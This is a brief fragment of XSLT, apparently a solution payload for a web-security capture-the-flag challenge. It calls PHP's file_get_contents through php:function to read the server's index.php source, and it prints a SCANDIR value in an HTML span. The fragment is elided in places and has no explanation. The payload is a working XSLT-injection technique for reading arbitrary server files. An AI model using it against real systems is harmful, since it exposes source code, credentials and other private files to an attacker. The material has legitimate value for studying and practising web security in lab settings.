...
<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/> 
...
<span style="font-weight:bold">
 ...
 SCANDIR:<xsl:value-of select="@shandle[2]"/>
